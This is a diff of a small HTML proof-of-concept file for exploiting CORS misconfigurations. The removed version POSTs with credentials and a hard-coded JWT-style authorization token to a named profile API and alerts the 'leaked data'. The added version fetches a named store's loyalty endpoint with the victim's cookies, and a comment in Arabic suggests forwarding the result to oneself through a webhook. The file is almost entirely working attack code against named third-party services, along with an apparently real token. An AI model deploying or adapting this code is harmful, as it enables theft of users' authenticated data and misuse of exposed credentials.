@@ -1,24 +1,13 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>CORS Exploit PoC</title>
-</head>
-<body>
-  <h1>Testing CORS Exploitation...</h1>
-
-  <script>
-    fetch("https://api100.levex.com/service-user-manage/profile", {
-      method: "POST",
-      credentials: "include",
-      headers: {
-        "Content-Type": "application/json",
-        "X-Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHRyYSI6ImFhNjYyYTZkLTkzZWEtNDRkMy05ZjdkLWZmNmUzZmIwZDc1ZC0xNzQ3MDEyODQ4OTgwLURlZmF1bHQiLCJpc3MiOiJGSU5HQVRFIiwiZXhwIjoxNzQ3NjIwMDEwLCJzdWJqIjoxMTAyOTY4LCJib2R5Ijoi8Ka5qc-O5q6w06bwrZuG8KGdvPCks7nwqJmj4r2c7KqUIiwiaWF0IjoxNzQ3MDE1MjEwfQ."
-      },
-      body: JSON.stringify({})
-    })
-    .then(res => res.text())
-    .then(data => alert("Leaked data: " + data))
-    .catch(err => alert("Error: " + err));
-  </script>
-</body>
-</html>
+<script>
+  fetch("https://store.flow.com/loyalty?discoveryItemSlug=84a68a66-4e8e-4dc3-ab7e-5fe56bd4de0c", {
+    credentials: "include"
+  })
+  .then(res => res.text())
+  .then(data => {
+    console.log("Got data:", data);
+    // أو أرسله لنفسك باستخدام webhook
+  })
+  .catch(err => {
+    console.error("Error:", err);
+  });
+</script>
